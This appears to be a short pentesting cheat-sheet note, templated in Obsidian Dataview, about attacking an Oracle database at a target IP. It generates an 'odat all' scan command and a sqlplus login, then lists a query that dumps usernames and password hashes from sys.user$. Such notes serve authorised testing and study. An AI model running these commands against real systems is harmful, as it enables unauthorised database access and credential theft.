Cracking 
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `odat all -s ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
SQL login
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `sqlplus [user]/[passw]@${ip}/XE`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
SQL> select table_name from all_tables;
```

```
select name, password from sys.user$;
```
